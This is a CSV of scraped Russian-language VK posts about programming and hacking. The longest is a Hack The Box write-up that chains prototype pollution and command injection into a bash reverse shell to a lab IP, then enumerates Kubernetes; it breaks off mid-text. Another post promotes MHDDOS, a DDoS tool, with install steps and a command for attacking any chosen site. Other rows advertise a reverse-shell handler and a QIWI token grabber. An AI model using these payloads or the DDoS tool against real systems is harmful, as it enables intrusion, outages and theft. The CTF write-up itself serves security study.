url,date,likes,reposts,subscribers,text,images,index
https://vk.com/wall-173319510_15824,2021-09-08 21:08:23,0,0,956,"Hack The Box. My pro vedem tes tirova nie kli ent-ser verno go pri lozhe niia, ser vernaia chast' kotoro go napisa na na Node.js. A zatem porabo taem s orkes tra torom Kubernetes i cherez nego zakh vatim flag ruta. warning Pod kliu chat' sia k mashinam s HTB rekomen duet sia tol' ko cherez VPN. Ne delai eto go s komp' iute rov, gde est' vazh nye dlia tebia dan nye, tak kak ty oka zhesh' sia v obshchei seti s dru gimi uchas tni kami. Razvedka Skanirovanie portov Do bav liaem adres mashiny 10.10.10.235 v fail /etc/hosts kak unobtainium.htb i zapus kaem ska niro vanie por tov. Spravka: skanirovanie portov Ska niro vanie por tov -- stan dar tnyi per vyi shag pri liuboi ata ke. On poz volia et ata kuiushche mu uznat', kakie sluzh by na khos te pri nima iut soedi nenie. Na osno ve etoi informa tsii vybira etsia sle duiushchii shag k poluche niiu toch ki vkho da. Na ibo lee izves tnyi ins tru ment dlia ska niro vaniia -- eto Nmap. Uluch shit' rezul' taty ego raboty ty mozhesh' pri pomoshchi sle duiushche go skrip ta. ports = $(nmap -p- --min-rate =500 $1 | grep ^[ 0- 9] | cut -d '/ ' -f 1 | tr ' n' ', ' | sed s/,$//)nmap -p $ports -A $1 On dei stvu et v dva eta pa. Na per vom pro izvo dit sia obych noe bys troe ska niro vanie, na vto rom -- bolee tshcha tel' noe ska niro vanie, s ispol' zovani em ime iushchikh sia skrip tov (optsiia -A). Re zul' tat raboty skrip ta Re zul' tat raboty skrip ta (pro dol zhenie) Re zul' tat raboty skrip ta (okon chanie)Po rezul' tatam ska niro vaniia ime em vosem' otkry tykh por tov: port 22 -- sluzh ba SSH; port 80 -- Apache httpd 2.4.41; por ty 2379, 2380 -- poka neias no, chto eto; port 8443 -- tozhe veb-ser ver; por ty 10250, 10256 -- Golang HTTP-Server; port 31337 -- Node.js Express framework. Nach nem s osmotra sai ta. Star tovaia stra nitsa sai taZdes' nam daiut tol' ko ska chat' kakoe-to pri lozhe nie, chto my i dela em. Ska chiva em paket .deb i raz vorachi vaem, chto by ne usta nav livat' na lokal' nyi khost. Zatem nakhodim ispolnia emyi fail i zapus kaem pri lozhe nie. mkdir ubo ; cd mkdir dpkg- deb -xv unobtainium_ 1. 0. 0_ amd64. deb . . / opt/ unobtainium Ras pakov ka paketa deb Glav noe okno pri lozhe niiaIzu chiv pri lozhe nie, ponima em, chto ono ime et kli ent-ser vernuiu arkhi tek turu. Zdes' est' for ma otprav ki soob shchenii i voz mozhnost' smot ret' spi sok del. Spi sok vyg liadit vot tak: Create administrator zone. Update node JS API Server. Add Login functionality. Complete Get Messages feature. Complete ToDo feature. Implement Google Cloud Storage function. Improve security. Spi sok todo Analiz trafika Itak, my uzna li, chto ispol' zuet sia tekh nologiia Node.js, est' avto riza tsiia i raz delenie pri vile gii (punkt 1). Pos kol' ku pri lozhe nie -- eto kli ent, mozhem pred polozhit', chto ono stu chit sia na port 31337, obna ruzhen nyi nami pri ska niro vanii. Nam nuzh no pro verit' eto pred polozhe nie, a pomozhet nam v etom Wireshark. Otkry vaem ego i zapus kaem nashe pri lozhe nie sno va. Tra fik pri lozhe niia v WiresharkVi dim, chto pri lozhe nie rabota et po HTTP i dei stvi tel' no pod kliu chaet sia k por tu 31337. Ad res ser vernoi chas ti pri lozhe niiaPop robu em vruch nuiu ispol' zovat' fun ktsii pri lozhe niia, chto by uznat', kak imen no oni rabota iut. Zap rosim spi sok del i otpra vim kakoe-nibud' soob shchenie. Zap ros i otvet pri obra shchenii k todo Zap ros i otvet pri otprav ke soob shcheniiaMy mozhem sko piro vat' oba zap rosa i perenes ti ikh v Burp Repeater dlia dal' neishe go tes tirova niia. Tak zhe dlia udobs tva mozh no pere ime novat' vklad ki. PUT / HTTP / 1. 1 Host : unobtainium. htb: 31337 Connection : keep-alive Content-Length : 79 Accept : application/ json, text/ javascript, */ *; q=0. 01 User-Agent : Mozilla/ 5. 0 ( X11; Linux x86_64) AppleWebKit/ 537. 36 ( KHTML, like Gecko) unobtainium/ 1. 0. 0 Chrome/ 87. 0. 4280. 141 Electron/ 11. 2. 0 Safari/ 537. 36 Content-Type : application/ json Accept-Encoding : gzip, deflate Accept-Language : ru { ""auth"" : { ""name"" : ""felamos"" , ""password"" : ""Winter2021"" } , ""message"" : { ""text"" : ""qwerty"" } } POST / todo HTTP / 1. 1 Host : unobtainium. htb: 31337 Connection : keep-alive Content-Length : 73 Accept : application/ json, text/ javascript, */ *; q=0. 01 User-Agent : Mozilla/ 5. 0 ( X11; Linux x86_64) AppleWebKit/ 537. 36 ( KHTML, like Gecko) unobtainium/ 1. 0. 0 Chrome/ 87. 0. 4280. 141 Electron/ 11. 2. 0 Safari/ 537. 36 Content-Type : application/ json Accept-Encoding : gzip, deflate Accept-Language : ru { ""auth"" : { ""name"" : ""felamos"" , ""password"" : ""Winter2021"" } , ""filename"" : ""todo. txt"" } Zap rosy v Burp RepeaterV obo ikh zap rosakh mest dlia tes tirova niia dva: eto parametr text pri otprav ke soob shcheniia i filename pri zap rose fai la todo.txt. Popyt ka zap rosit' dru gie fai ly (nap rimer, /etc/passwd) ni k chemu ne pri vela, a esli toch nee, pri vela k zavisa niiu pri lozhe niia. No vot v slu chae pus togo zap rosa my poluchim oshib ku. Oshib ka Tochka vkhoda V tek ste oshib ki vidim nes kol' ko ras kry tykh putei k fai lam. Tak kak ispol' zuet sia Node.js, zap rosim vazh nyi fail index.js. Pos kol' ku soder zhimoe fai la nefor matiro van noe, dlia udobs tva otpra vim ego v ras shirenie Burp Hackvector. Vybira em String - Replace i menia em pos ledova tel' nos ti n, t i "" na n, t i "". Star tovaia stra nitsa sai taKod na skrin shot ne pomeshcha etsia, poeto mu pri vedu ego nizhe. var root = require ( "" google-cloudstorage-commands "" ) ; const express = require ( ' express ' ) ; const { exec } = require ( "" child_process "" ) ; const bodyParser = require ( ' body-parser ' ) ; const _ = require ( ' lodash ' ) ; const app = express () ; var fs = require ( ' fs ' ) ; const users = [ { name : ' felamos ' , password : ' Winter2021 ' } , { name : ' admin ' , password : Math . random () . toString ( 32 ) , canDelete : true , canUpload : true } , ] ; let messages = [] ; let lastId = 1 ; function findUser ( auth ) { return users . find ( ( u ) => u . name === auth . name & & u . password === auth . password ; } app . use ( bodyParser . json ()) ; app . get ( ' / ' , ( req , res ) => { res . send ( messages ) ; }) ; app . put ( ' / ' , ( req , res ) => { const user = findUser ( req . body . auth || {}) ; if ( ! user ) { res . status ( 403 ) . send ( { ok : false , error : ' Access denied ' }) ; return ; } const message = { icon : ' __ ' , } ; _ . merge ( message , req . body . message , { id : lastId ++ , timestamp : Date . now () , userName : user . name , }) ; messages . push ( message ) ; res . send ( { ok : true }) ; }) ; app . delete ( ' / ' , ( req , res ) => { const user = findUser ( req . body . auth || {}) ; if ( ! user || ! user . canDelete ) { res . status ( 403 ) . send ( { ok : false , error : ' Access denied ' }) ; return ; } messages = messages . filter ( ( m ) => m . id !== req . body . messageId ) ; res . send ( { ok : true }) ; }) ; app . post ( ' / upload ' , ( req , res ) => { const user = findUser ( req . body . auth || {}) ; if ( ! user || ! user . canUpload ) { res . status ( 403 ) . send ( { ok : false , error : ' Access denied ' }) ; return ; } filename = req . body . filename ; root . upload ( "" . / "" , filename , true ) ; res . send ( { ok : true , Uploaded_File : filename }) ; }) ; app . post ( ' / todo ' , ( req , res ) => { const user = findUser ( req . body . auth || {}) ; if ( ! user ) { res . status ( 403 ) . send ( { ok : false , error : ' Access denied ' }) ; return ; } filename = req . body . filename ; testFolder = "" / usr/ src/ app "" ; fs . readdirSync ( testFolder ) . forEach ( file => { if ( file . indexOf ( filename ) > - 1 ) { var buffer = fs . readFileSync ( filename ) . toString () ; res . send ( { ok : true , content : buffer }) ; } }) ; }) ; app . listen ( 3000 ) ; console . log ( ' Listening on port 3000.. . ' ) ; V samom nachale pod kliu chaiut sia nekoto rye bib liote ki. Tak kak eto Node.js, my mozhem zap rosit' fail package.json, chto by uznat' ver sii pod kliu chaemykh bib liotek. So der zhimoe fai la package.jsonU nas est' sle duiushchie zavisi mos ti: body-parser: 1.18.3; express: 4.16.4; lodash: 4.17.4; google-cloudstorage-commands: 0.0.1; Nam izves tny tekh nologii, poeto mu sle duet pois kat' gotovye eks plo ity, chto by poniat', kakie mogut byt' uiaz vimos ti. Delat' eto luch she vse go pri pomoshchi Google. Po isk uiaz vimos tei s pomoshch'iu Google Po isk uiaz vimos tei s pomoshch'iu GoogleTak my nakhodim dve uiaz vimos ti v moduliakh google-cloudstorage-commands i lodash. Per vaia mozhet dat' nam OS Command injection, to est', dru gimi slo vami, uda len noe vypol nenie komand. U nas uzhe est' uiaz vimyi blok koda (nizhe pri vede ny skri ny iz PoC i koda index.js). PoC eks plo ita google-cloudstorage-commands Kod obra bot chika metoda post iz fai la index.jsPri pereda che paramet ra filename metodom POST na stra nitsu /upload my mozhem vypol nit' koman du. No pered etim ser ver pro veria et, ime et li dan nyi pol' zovatel' svoi stvo canUpload. Ob' ekty usersEtikh svoi stv u nas net, no mozhem ikh poluchit'. V etom pomozhet kri tiches kaia uiaz vimost' v bib liote ke lodash. My mozhem ispol' zovat' atri but constructor ob' ekta, pred stav liaiushche go pol' zovate lia, chto by akti viro vat' dan nye pri vile gii. I u nas sno va est' uiaz vimyi blok koda (nizhe pri vede ny skri ny iz PoC i koda index.js). Pri mer uiaz vimogo koda lodash Kod obra bot chika metoda put iz fai la index.jsPri pereda che paramet ra text metodom PUT na stra nitsu / my smo zhem vypol nit' opas noe sli ianie ob' ektov. Tochka opory Da vai pro eks plu ati ruem eto i akti viru em u sebia svoi stva canUpload i canDelete. Dlia eto go otpra vim sle duiushchee soob shchenie: { ""text"" : { ""constructor"" : { ""prototype"" : { ""canDelete"" : true , ""canUpload"" : true } } } } } Ak tivatsiia pri vile giiPo luchi li otvet, chto vse vypol neno bez oshi bok. Teper' dlia pro ver ki vypol nim koman du id, kak bylo opi sano vyshe. Rezul' tat zapishem v fail. Vy pol nenie koman dy i zapis' rezul' tata v failOs talos' pro chest' soder zhimoe fai la legitim nym spo sobom. Chte nie fai laKak mozh no uvi det', koman da uspeshno vypol nena, a vsia nasha kon tseptsiia poluchi la pod tverzhde nie. Mozh no vypol nit' revers-shell. Spravka: revers-shell Ob ratnyi shell -- eto pod kliu chenie, kotoroe akti viru et ata kuemaia mashina, a my pri nima em i takim obra zom pod kliu chaem sia k nei, chto by vypol niat' koman dy ot litsa pol' zovate lia, kotoryi zapus til shell. Dlia pri ema soedi neniia neob khodimo soz dat' na lokal' noi mashine listener, to est' <<slu shatel'>>. V takikh slu chaiakh pri godit sia rlwrap -- readline-obo loch ka, kotoraia v chis le pro chego poz volia et pol' zovat' sia isto riei komand. Ona obych no dos tupna v repozi torii dis tri buti va. apt install rlwrap V kaches tve samogo lis tenera pri etom mozh no ispol' zovat' shiroko izves tnyi netcat. rlwrap nc -lvp [ port] Chto by bys tro vos sta nav livat' soedi nenie v slu chae ego poteri, ia napisal malen' kii skript na Bash, soder zhashchii dve koman dy. Eto te zhe koman dy, chto pred stav leny v zap rosakh vyshe, tol' ko bez chte niia fai la. #!/ bin/ bash curl -X PUT -H ""Content-Type: application/ json"" -d '{ ""auth"":{ ""name"": ""felamos"", ""password"": ""Winter2021""}, ""message"":{ ""text"":{ ""constructor"":{ ""prototype"":{ ""canDelete"": true, ""canUpload"": true}}}}} ' http:/ / unobtainium. htb: 31337/ curl -X POST -H ""Content-Type: application/ json"" -d '{ ""auth"":{ ""name"": ""felamos"", ""password"": ""Winter2021""}, ""filename"": ""& echo ""bash -i > & / dev/ tcp/ 10. 10. 14. 126/ 4321 0> & 1"" | bash""} ' http:/ / unobtainium. htb: 31337/ upload Flag pol' zovate lia Prodvizhenie Te per', kog da my poluchi li dos tup k khos tu, nam neob khodimo sob rat' informa tsiiu. Dlia eto go ia obych no ispol' zuiu skrip ty PEASS. Spravka: skripty PEASS dlia Linux Chto delat' pos le togo, kak my poluchi li dos tup v sis temu ot ime ni pol' zovate lia? Vari antov dal' neishei eks plu ata tsii i povyshe niia pri vile gii mozhet byt' ochen' mno go, kak v Linux, tak i v Windows. Chto by sob rat' informa tsiiu i nametit' tseli, mozh no ispol' zovat' Privilege Escalation Awesome Scripts SUITE (PEASS) -- nabor skrip tov, kotorye pro veria iut sis temu na avto mate. Chto by vos pol' zovat' sia skrip tom, ego nado sna chala zag ruzit' na lokal' nyi khost. wget https:/ / github. com/ carlospolop/ privilege- escalation- awesome- scripts- suite/ blob/ master/ linPEAS/ linpeas. sh Te per' nuzh no zag ruzit' ego na uda len nyi khost. V direk torii so skrip tom na lokal' noi mashine zapus tim s pomoshch'iu Python pros toi veb-ser ver. Pos le vypol neniia etoi koman dy veb-ser ver budet pros lushivat' port 8000. python3 -m http. server A teper' s pomoshch'iu togo zhe wget na tselevoi mashine zag ruzim skript s lokal' nogo khos ta na uda len nyi. Pos le zag ruzki neob khodimo dat' fai lu pra vo na vypol nenie i vypol nit' skript. wget http://[ ip_lokal'nogo_khosta] : 8000/ linpeas. sh chmod +x linpeas. sh . / linpeas. sh Iz vyvoda LinPEAS ia uznal, chto na khos te rabota et pol' zovatel' skaia zadacha v cron. Kazh duiu minutu pro iskho dit poisk i uda lenie fai la kubectl. A eto ozna chaet ispol' zovanie orkes tra tora Kubernetes. Za dachi cronKubernetes poz volia et upravliat' klas terom kon tei nerov Linux kak edi noi sis temoi. Kubernetes upravlia et kon tei nerami Docker, zapus kaet ikh na bol' shom koliches tve khos tov, a tak zhe obes pechiva et sov mes tnoe raz meshchenie i rep likatsiiu bol' shogo koliches tva kon tei nerov. Chto nam nuzh no ponimat' pri rabote s Kubernetes: Node -- eto mashina v klas tere Kubernetes; Pod -- eto grup pa kon tei nerov s obshchi mi raz delami, zapus kaemykh kak edi noe tseloe; Service -- eto abs trak tsiia, kotoraia opre delia et logiches kii ob' edi nen nyi nabor pod i politi ku dos tupa k nim; Volume -- eto direk toriia (voz mozhno, s dan nymi), kotoraia dos tupna v kon tei nere; Label -- eto para kliuch/zna chenie, kotorye prik replia iutsia k ob' ektam, nap rimer podam, i mogut byt' ispol' zovany dlia soz daniia i vybora naborov ob' ektov. Dlia raboty s kuberom nam nuzhen kubectl, a on uda liaet sia raz v minutu. Ska chaem ego na lokal' nuiu mashinu, a zatem zag ruzim na uda len nyi khost takim zhe spo sobom, kak i LinPEAS. Ia zag ruzhaiu ego pod ime nem kctl. Te per' fail uda liat' sia ne budet, mozhem porabo tat' s Kubernetes. Bla goda ria kubectl nam dos tupna koman da can-i, s pomoshch'iu kotoroi my mozhem pro verit' svoi pri vile gii na to ili inoe dei stvie. V otvet budet voz vra shchat' sia yes ili no. V klas tere Kubernetes ob' ekty secret pred nazna cheny dlia khra neniia kon fiden tsial' noi informa tsii, takoi kak paroli, tokeny OAuth ili kliu chi SSH. I eto per voe, chto nuzh no pro verit'. kubectl auth can- i list secrets Pro ver ka sek retovK sozhale niiu, my ne mozhem pros motret' sek rety. Sle duiushchee, chto nuzh no pro verit', -- eto pros trans tva imen (namespaces) -- vir tual' nye klas tery, rabota iushchie v odnom i tom zhe fiziches kom klas tere. Namespaces pre dos tavlia iut nabor uni kal' nykh imen dlia resur sov. Davai uzna em, mozhem li my poluchit' ikh. kubectl auth can- i list namespaces Pro ver ka pros transtv imenMy mozhem poluchit' pros trans tva imen sle duiushchei pros toi koman doi. kubectl get namespaces Po luche nie namespacesPo umol chaniiu v klas tere Kubernetes budet soz dano pros trans tvo imen default, v kotorom raz meshcha iutsia zapus kaemye ob' ekty. Pros trans tva kube-public i kube-system ispol' zuiut sia dlia zapus ka slu zheb nykh ob' ektov Kubernetes, neob khodimykh dlia kor rek tnoi raboty klas tera. No nam (sudia po naz vaniiu) bol' she inte res no pros trans tvo imen dev i sis temnyi kube-system. No ni v per vom, ni vo vto rom pros trans tve dos tupa k sek retam ne ime em. kubectl auth can- i list secrets -n dev kubectl auth can- i list secrets -n kube- system Pro ver ka sek retovS sek retami ne poluchi los', pos motrim na pody. Kazh dyi pod sos toit iz odno go ili nes kol' kikh kon tei nerov, khra nili shcha, otdel' nogo IP-adre sa i optsii, kotorye opre delia iut, kak imen no kon tei nery dol zhny zapus kat' sia. Tak zhe pod pred stav liaet soboi nekii zapushchen nyi pro tsess v klas tere Kubernetes. No chashche vse go v podakh ispol' zuiut sia kon tei nery Docker. Pos motrim, mozhem li my poluchit' pody iz pros trans tva dev, a pos le polozhi tel' nogo otve ta poluchim ikh spi sok. kubectl auth can- i list pods -n dev kubectl get pods -n dev Po luche nie podov v pros trans tve devDa vai poluchim opi sanie poda. Tak kak eto tselyi kon tei ner, nam inte res na voz mozhnost' ras prostra neniia po seti, a iz opi saniia smo zhem uznat' adres. kubectl describe pod/ devnode- deployment- cd86fb5c- 6ms8d -n dev Opi sanie podaTak, iz opi saniia poda devnode-deployment-cd86fb5c-6ms8d my vidim adres 172.17.0.8 i otkry tyi port 3000. Oka zalos', chto tam rabota et takoi zhe ser vis, poeto mu my mozhem poluchit'",[],51
https://vk.com/wall-3183750_353221,2021-09-08 17:40:00,57,71,94166,Iazyk programmirovaniia Python3     No. 1 - Komandnaia stroka   No. 2 - Uslovnye operatory i vyrazheniia   No. 3 - Posledovatel'nosti i tsikl for   No. 4 - Funktsii i mnozhestva   No. 5 - Rekursiia i iteratory   No. 6 - Stroki   No. 7 - Kheshirovanie i slovari   No. 8 - Zamykanie i dekoratory   No. 9 - Prostranstva imion: moduli i klassy   No. 10 - Ob'ektnaia model' Python     Polnyi kurs lektsii v videoal'bome: https://vk.cc/arvHJd   #video #python       #video@php2all ( videokursy v al'bome https://vk.com/videos-3183750 ),"['https://sun9-82.userapi.com/8qgi9e1H-5zNUVDk8g9jVHuPnANamIHsVek9nA/0hE4S1FHGKI.jpg', 'https://sun9-63.userapi.com/c857524/v857524511/1a6f23/Jej-6C8Fpfg.jpg', 'https://sun9-60.userapi.com/5abxhUKrDsEyCW0rsaFHceWOhPA5o9DTC3bd5w/r6zrNsY_vu8.jpg', 'https://sun9-45.userapi.com/Bc_p7MasiLqis2jKlgYCJtITsYY1rCrIBJiu5w/DnUQOKYL5mA.jpg', 'https://sun9-8.userapi.com/vAyiO2lMs1VVnVObiAj5ri6hcGLS0LAu3b2h5A/CDtLV7ssjUo.jpg', 'https://sun9-63.userapi.com/c855332/v855332511/21603f/O91rC_5Jb4o.jpg', 'https://sun9-83.userapi.com/c857436/v857436511/1af997/I9WUu2oNFjA.jpg', 'https://sun9-77.userapi.com/uB3P0QggRrpS0hKctOBAnZwGX9EoGJMem1u9lQ/w0ghc3_XfXk.jpg', 'https://sun9-26.userapi.com/c858232/v858232511/1af1a9/kReZfhuSJ-o.jpg', 'https://sun9-75.userapi.com/c856128/v856128511/20f7ab/j95Jj3GBmuA.jpg']",52
https://vk.com/wall-169106523_14545,2021-09-08 15:53:00,37,64,10928,#pentest@greyteam  #windows@greyteam,[],53
https://vk.com/wall-95686747_8390,2021-09-08 15:30:01,47,39,8376,"Postavil sebe vchera na test liubopytnuiu sistemu avtomatizatsii upravleniia setevymi ustroistvami - eNMS.    https://github.com/eNMS-automation/eNMS  https://www.enms.io/    Ia sam podobnye sistemy ne ekspluatiroval, no poslednee vremia prismatrivaius' i eto uzhe ne pervyi podobnyi produkt v pole moego zreniia. Tam ideia takaia. Vy dobavliaete setevye ustroistva, ukazyvaia ikh opisanie v vide raspolozheniia, geograficheskikh koordinat, ip adresa i t.d. Ustroistva avtomaticheski zanosiatsia na geograficheskuiu kartu. Mezhdu nimi nastraivaiutsia sviazi.    K ustroistvam mozhno podkliuchat'sia po ssh priamo cherez veb interfeis. Mozhno sozdavat' razlichnye zadachi v vide ansible pleibukov, bash skriptov ili kakikh-to eshche nastroek. Mozhno sozdavat' tak nazyvaemye workflow v vide posledovatel'nosti zadach s razlichnymi perekhodami v zavisimosti ot statusov vypolnennykh predydushchikh zadanii. Mozhno dobavliat' reguliarnye zadachi po raspisaniiu. Vsio eto mozhet byt' priviazano i zapushcheno na konkretnykh ustroistvakh.    V obshchem, tam mnogo vsego dlia avtomatizatsii. Est' vstroennaia sistema opoveshchenii i kontrolia dostupa na baze pol'zovatelei, grupp i rolei. Stavitsia vsio prosto. Ia na Ubuntu zapustil sleduiushchim obrazom:    # apt install git python3-pip  # git clone https://github.com/afourmy/eNMS.git  # cd eNMS  # pip3 install -r build/requirements/requirements.txt  # export FLASK_APP=app.py  # flask run --host=0.0.0.0    I dal'she zashel http://10.20.1.16:5000/, uchiotka admin / admin.  V sisteme uzhe budet demo nabor dannykh, tak chto mozhno srazu otsenit' vozmozhnosti i realizatsiiu.    U proekta neplokhaia dokumentatsiia - https://enms.readthedocs.io/en/develop/base/features.html No eto ne ta sistema, kotoruiu mozhno s pol tychka osvoit', nado razbirat'sia. V runete voobshche ne nashiol po nei informatsii. V gugle tol'ko obshchie slova. Na vid sistema ne plokha, s uchiotom togo, chto ona polnost'iu besplatnaia.","['https://sun9-27.userapi.com/impg/NoC90cySyt5npw1t879V85yAsKwH9o3saOZ6fQ/NvE65lyX3vU.jpg?size=200x133&quality=96&crop=299,0,1311,872&sign=3b2f66bc3ae1d98401b95b22ab36db71&c_uniq_tag=VmiHizM9YftOp88x91dtDhKr9ul9SdVCLHYjKYUUkaU&type=album']",54
https://vk.com/wall-206419000_2,2021-09-08 13:47:53,59,61,90,"MHDDOS v termux  Mhddos -- utilita dlia DDoS-ataki s 36iu razlichnymi metodami.  Ustanovka  $ pkg update  $ pkg upgrade  $ pkg install git  $ pkg install python  $ git clone https://github.com/darkness-falls/mhddos  $ cd mhddos  $ python -m pip install -r requirements.txt   Ispol'zovanie $ python3 start.py  $ python3 start.py bypass https://example.com (ssylku na sait kotorye khotite ddosit') 5 1000 socks5.txt 100 100  Diskleimer: Nizhe predstavlennyi material, iavliaetsia oznakomitel'nym . Avtor ne nesiot otvetstvennosti za deistviia sovershennye chitateliami.  Skript polnost'iu rabochii ","['https://sun9-73.userapi.com/impg/QjdLefnbXXemR94ld9puW7kveyNiBQD_OUmnJw/OQbXj0PReQo.jpg?size=200x133&quality=96&crop=234,0,331,220&sign=c616fa0149fe9a17028d0ed640ecbcab&c_uniq_tag=Ui7vHtL2fjMDBv_3mv_zcR_lC50W3h00-0lSZDvlG5U&type=album']",55
https://vk.com/wall-163266641_831,2021-09-08 10:12:00,0,1,462,"Udalenie znakov prepinaniia   Modul' string v Python imeet mnozhestvo vstroennykh konstant s otdel'nymi naborami simvolov. string.punctuation -- odin iz nikh, poetomu my budem ispol'zovat' ego dlia ochistki stroki.  V Python3 string.punctuation -- eto predvaritel'no initsializirovannaia stroka, ispol'zuemaia kak strokovaia konstanta. V Python string.punctuation dast vse nabory znakov prepinaniia.","['https://sun9-10.userapi.com/impg/tE9rTWGO4Ro_0-F0QgUhCC5gT6M7t08szrGr-Q/kK8Ty4_Ovdc.jpg?size=200x124&quality=96&crop=432,0,200,124&sign=33b8675bc7ed3cf014ed45480f8cbcf7&c_uniq_tag=IEEHw2Pfiqh2j4DbOPw1mvsrqlzoL_jLhcRvAshvlAw&type=album']",56
https://vk.com/wall-124509601_58,2021-09-08 05:17:56,4,2,41,"Vnimanie! Novaia vakansiia! Ishchem Middle Python Developer. My ishchem Python-razrabotchika dlia proekta razrabotki integratsii CRM-sistemy i sistemy telefonii Asterisk. Proekt predpolagaet: - pogruzhenie v tekhnologiiu IP-telefonii, - ispol'zovanie asinkhronnogo programmirovaniia, - razvitie biznes-logiki prilozheniia, - integratsiiu s drugimi CRM-sistemami, - posleduiushchee razmeshchenie koda v OpenSource. Esli ty imeesh': - uverennye znaniia python3 - ponimanie i ispol'zovanie OOP i patternov programmirovaniia - opyt kommercheskoi razrabotki ot 1 goda Obiazatel'no pishi, i my obsudim n'iuansy. Polnoe opisanie vakansii https://omsk.hh.ru/vacancy/47478428",[],57
https://vk.com/wall-163703907_31814,2021-09-07 15:00:01,61,78,23805,,[],58
https://vk.com/wall-105076815_38333,2021-09-07 11:34:00,0,0,5023,Penelope is an advanced shell handler. Its main aim is to replace netcat as shell catcher during exploiting RCE vulnerabilities.It works on Linux and macOS and the only requirement is Python3. It is one script without 3rd party dependencies and hopefully it will stay that way.Among the main features are:Auto-upgrade shells to PTY (auto-resize included)Logging interaction with the targetsDownload files from targetsUpload files to targetsUpload preset scripts to targetsSpawn backup shellsMultiple sessionsMultiple listenersCan be imported by exploits and get shell on the same terminal (see extras)Penelope can work in conjunction with metasploit exploits by disabling the default handler with set DisablePayloadHandler TrueIt supports Windows shells but autoupgrade is not implemented yet. However it can accept PTY shells from the excellent project ConPtyShell of @antonioCoco. Autoresize of PTY is implemented.Sample basic usagereverse shells on 0.0.0.0:4444penelope.py 5555              # Listening for reverse shells on 0... #penelope #simulation #socket #unix #windows,[],59
https://vk.com/wall124425123_1515,2021-09-07 09:04:53,0,0,34,"Sobiraem proekt na python3&PyQT5 pod Windows, ispol'zuia PyInstaller",[],60
https://vk.com/wall606741896_126,2021-09-06 21:15:12,1,0,5,"Prosmotr vsei dostupnoi informatsii po tokenu QIWI (krome nomera bank. karty i t.p.)  Soft sdelan dlia tekh, komu nuzhno uznat' dannye o svoiom koshel'ke ili o validnosti informatsii koshel'ka druga , a voobshche - reshaite sami.   Soft napisan na python3.8+  Komanda dlia zapuska: python QiwiGrabber.py   (Nu ili prosto otkroite etot fail, esli vy s Windows 7+)","['https://sun9-52.userapi.com/impg/Fs69TZ6n01RmB4qWjZMnD1bTIZV3EL0WLbn0EQ/9YcB7gPxk7c.jpg?size=200x133&quality=96&crop=86,0,1006,669&sign=e9d99297a6d44e3b71f0380714a719c6&c_uniq_tag=svn-lhbDJtWnN7yOSLBhq7TXHDyG-rNFOWztxw-1hrU&type=album']",61
https://vk.com/wall-189351141_16274,2021-09-06 18:44:52,0,1,428,"Posle dvukh tvitov, ostavlennykh na proshloi nedele, pro moi igry s UEFI i Rust, neskol'ko chelovek poprosili opublikovat' zametku, ob'iasniaiushchuiu kak sozdat' UEFI-prilozhenie, polnost'iu napisannoe na Raste i prodemonstrirovat' testovoe okruzhenie.",[],62
https://vk.com/wall-179030782_10627,2021-09-06 13:31:08,0,0,2067,  Podborka vakansii dlia razrabotchikovSenior razrabotchik mobil'nykh prilozhenii (udal...    Podborka vakansii dlia razrabotchikov  Senior razrabotchik mobil'nykh prilozhenii (udalenno) Zarplata Ot 250 000 R https://bit.ly/38KThE0  QA Engineer SberDevices (B2E) Zarplata Ot 200 000 R https://bit.ly/3jLx3I7  Senior Go Blockchain Developer (Team Lead) Zarplata Ot 200 000 do 300 000 R https://bit.ly/3yMaozW  Senior .NET Backend Developer Zarplata Ot 180 000 do 260 000 R https://bit.ly/2WWEG5W  Middle python developer (django/python3.8) Zarplata Ot 80 000 do 140 000 R https://bit.ly/2WVIFzg,['https://sun9-64.userapi.com/impg/e4IM56dxV3V1ACw954gJsDQTOZicmCixc5TGdw/jT01rfaW73I.jpg?size=200x200&quality=96&sign=77f4b96a7bd7ff6e7038661fe08b6ef8&c_uniq_tag=Xj8U-1BRp6JFwjLcOmpTy2MI0R8__cpa28i5apD_ihI&type=album'],63
https://vk.com/wall-3183750_352994,2021-09-05 20:24:00,9,1,94166,*/30 08-19 * * 1-5 python3 ~/do-my-job.py,['https://i.mycdn.me/getVideoPreview?id=1725126806066&idx=0&type=39&tkn=qzgQAxMF50wENghgoIB45fbCRLk&fn=vid_l&c_uniq_tag=g4ZvcofaC9LS1m0OjkVWtpfhvuNh-FECMiPD83zn4XM'],64
